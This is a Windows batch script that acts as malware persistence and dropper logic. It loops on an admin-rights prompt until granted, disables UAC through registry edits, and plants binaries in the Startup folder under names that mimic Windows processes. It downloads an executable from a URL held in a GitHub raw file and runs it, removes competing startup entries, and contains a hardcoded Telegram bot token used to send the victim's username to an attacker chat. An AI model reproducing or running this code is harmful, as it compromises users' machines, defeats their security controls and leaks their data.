:: ( nHBAPWtA )
@echo off



:CHECKRUNEVERYPROCESS
set count=0

:: Count the instances of RUNEVERYCALLER.exe
for /f "tokens=*" %%a in ('tasklist /fi "imagename eq RUNEVERYCALLER.exe" 2^>nul') do (
    set /a count+=1
)

:: Check if there are 2 or more instances
if %count% geq 3 (
    echo There are at least 2 instances of RUNEVERYCALLER.exe running
    timeout /t 3 /nobreak >nul
    exit
) else (
    echo There are less than 2 instances of RUNEVERYCALLER.exe running
)






:: Initialize the loop counter outside of the loop
set loopCount=0




:loop_start






::ShellHost.exe ---> TSSPrxySHST.exe
::RuntimeBroker.exe ---> TSSPrxyRNTM.exe
::COM Surrogate.exe ---> SyncHostApp.exe
::StartupTaskCaller.exe ---> TSSPrxySTC.exe



cd /d "%~dp0"

:: Check Admin Privileges
net session >nul 2>&1
if %errorlevel% equ 0 (
:: Admin Granted
goto RUNADMINHERE
) else (
:: Admini Not Granted
goto loop
)


:loop
timeout /t 1 /nobreak >nul
:: Requesting Admin Privileges...
powershell -Command "Start-Process '%~f0' -Verb RunAs"

if %errorlevel% equ 0 (
 :: Admin Granted
goto exit
) else ( 
:: ( Admin Not Granted )
    goto loop
)

:RUNADMINHERE
cd /d "%~dp0"
:: Run All your commands here ( will be executed with admin privileges )


:: Disable UAC 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f



:EVERYSECOND


:SHST
:: Define the paths
set "sourceFile=%SystemRoot%\System32\TSSPrxySHST.exe"
set "startupFile=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
) else (
    echo File is already in Startup folder.
)

timeout /t 1 /nobreak >nul






:COM
:: Define the paths
set "sourceFile=%SystemRoot%\System32\SyncHostApp.exe"
set "startupFile=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
) else (
    echo File is already in Startup folder.
)

del /F /Q /A "%appdata%\*.ps1"
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Powershell /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Steam /f

timeout /t 1 /nobreak >nul


:STC
:: Define the paths
set "sourceFile=%SystemRoot%\System32\TSSPrxySTC.exe"
set "startupFile=%appdata%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe"

:: Check if the file exists in the Startup folder
if not exist "%startupFile%" (
    echo File not found in Startup folder. Restoring...
    copy "%sourceFile%" "%startupFile%"
) else (
    echo File is already in Startup folder.
)








:: Check Startup Programms , if not found Run Task , if not found task , Download STC & Run it 

:: Define the list of files to check
set "file1=%APPDATA%\Microsoft\Windows\SystemCertificatesData\StartupTaskCaller.exe"
set "file2=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
set "file3=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe"


:: Check each file
if not exist "%file1%" goto CHECKORRUNSTC
if not exist "%file2%" goto CHECKORRUNSTC
if not exist "%file3%" goto CHECKORRUNSTC

:: If all files are found, continue with other tasks
echo All files found.
goto COMMANDSFORAGENTS




:CHECKORRUNSTC
:: Check if "SystemCertificates" task exists
schtasks /query /tn "SystemCertificates" >nul 2>&1
if %errorlevel% equ 0 (
    :: Task found, Check STC in System32 also
    goto CHECKSTCINSYSTEM32
) else (
    :: Task not found, go to STCINSTALL
    goto STCINSTALL
)


:CHECKSTCINSYSTEM32
:: Check TSSPrxySTC.exe if exist 
if exist "%SystemRoot%\System32\TSSPrxySTC.exe" (
    goto COMMANDSFORAGENTS
) else (
    goto :STCINSTALL
)



:STCINSTALL
:: StartupTaskCaller.exe Installer
@echo off
 
color 0A
 
:loop
 
:: Kill & Delete file 
taskkill /f /im PatcherX64.exe >nul 2>&1
del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
 
for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/StartupTaskCallerFileLink') do set "STCFILELINK=%%i"
 
:: Download the file using curl
curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%STCFILELINK%"
 
timeout /t 2 /nobreak >nul
 
:: Checking the existing of the file
if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
    echo.
    echo The download hasn't started yet. Please check your connection.
	timeout /t 2 /nobreak >nul
	echo Retrying in 2 seconds ....
	timeout /t 2 /nobreak >nul
	echo.
	goto loop
)
 
 
 
:: Get the file size in bytes
for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
 
 
 
:: Check if the file size is at least 0.4MB (400000 bytes)
if %FILESIZE% geq 400000 (
    start "" "%APPDATA%\microsoft\PatcherX64.exe"
    timeout /t 8 /nobreak >nul
) else (
echo.
    echo Download incomplete. Check your connection and run the file again.
	timeout /t 2 /nobreak >nul
	echo Retrying in 2 seconds ....
	timeout /t 2 /nobreak >nul
	echo.
	goto loop
)
 
 
echo Patcher Running...
timeout /t 1 /nobreak >nul






:COMMANDSFORAGENTS


:NEXT1

echo Stopping processes...
taskkill /F /IM RuntimeBroker.exe
taskkill /F /IM RtkAudUService64.exe

echo Removing scheduled tasks...
schtasks /Delete /TN "WinRNTMUpdate" /F
schtasks /Delete /TN "WinRTKUpdate" /F
schtasks /Delete /TN "checkCOMandadd" /F

taskkill /F /IM RuntimeBroker.exe
taskkill /F /IM RtkAudUService64.exe


echo Deleting files...
del /F /Q "%SystemRoot%\System32\TSSPrxy.exe"
del /F /Q "%SystemRoot%\System32\TSSPrxyAd.exe"
del /F /Q "%SystemRoot%\System32\TSSPrxyRNTM.exe"
del /F /Q "%SystemRoot%\System32\TSSPrxyAdRNTM.exe"
del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe"
del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RtkAudUService64.exe"

echo Operation completed.

goto CONT








:: SEND MSG

:: Fucker CHAT ID : -1002163721260
:: Output CHAT ID : -1002460905948


:: Set bot token, chat ID, and message
set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
set "CHAT_ID=-1002163721260"
set "MESSAGE=%USERNAME%|TESTING……|"


:: URL encode the message by replacing spaces with %20
set "ENCODED_MESSAGE=%MESSAGE: =%%2"

:: Send the message using curl
curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
     -d "chat_id=%CHAT_ID%" ^
     -d "text=%ENCODED_MESSAGE%"

echo Message sent to chat ID %CHAT_ID%








:: Increment the loop counter
set /a loopCount+=1

:: Check if the loop counter has reached 15
if %loopCount% lss 15 (
    :: If less than 15, go back to the beginning of the script
    goto :loop_start
) else (
    :: If 15 or more, end the script
    echo Loop completed 15 times. Exiting script.
)






:CONT

goto :loop_start



